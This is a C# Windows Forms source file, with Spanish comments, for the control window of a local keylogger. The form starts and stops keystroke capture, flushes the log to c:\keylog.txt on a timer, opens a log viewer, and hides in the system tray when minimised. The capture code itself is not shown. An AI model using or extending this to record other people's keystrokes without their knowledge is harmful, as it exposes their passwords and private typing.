using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace KeyLoggerLocal
{
    public partial class frmKeyLogger : Form
    {
        string filename=@"c:\keylog.txt";

        KeyLogger kl;

        // Menu Contextual para el icono del SysTray
        ContextMenu contextMenu = new ContextMenu();

        public frmKeyLogger()
        {
            InitializeComponent();

            // Evento de cambio de tamaño del formulario
            this.SizeChanged+=new EventHandler(Form1_SizeChanged);

            // Creamos el menu contextual para el icono del systray
            contextMenu.MenuItems.Add("&Restaurar", new EventHandler(this.Restaurar));
            notifyIcon1.ContextMenu = contextMenu;

        }

        // Se produce cuando hay un cambio de tamaño en el formulario, en nuestro caso
        // dentro de la funcion comprobamos si lo que se produce es un minimizado de la 
        // aplicacion en tal caso enviamos la aplicacion al SysTray
        private void Form1_SizeChanged(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.Hide();
            }
        }

        private void Restaurar(object sender, EventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
            this.BringToFront();
            this.Activate();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Inicializamos los valores
            textBox1.Text = "60000";
            textBox3.Text = filename;

            try
            {
                kl = new KeyLogger(filename);
                kl.FlushInterval = Convert.ToDouble(textBox1.Text);
            }
            catch (Exception)
            {
                MessageBox.Show("FlushInterval especificado erroneo");
            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                kl.Enabled = true;
                kl.Flush2File(textBox3.Text, true);

                // Habilitamos o desabilitamos los botones y los textbox necesarios
                button1.Enabled = false;
                button2.Enabled = true;
                textBox1.Enabled = false;
                textBox3.Enabled = false;
                button3.Enabled = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Se ha producido un error al iniciar el KeyLogger:" + ex.Message);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                kl.Flush2File(textBox3.Text, true);
                kl.Enabled = false;

                // Habilitamos o desabilitamos los botones y los textbox necesarios
                button2.Enabled = false;
                button1.Enabled = true;
                textBox1.Enabled = true;
                textBox3.Enabled = false;
                button3.Enabled = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Se ha producido un error al parar el KeyLogger:" + ex.Message);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            frmVerLog vlog = new frmVerLog(textBox3.Text);
            vlog.Show();
        }

    }
}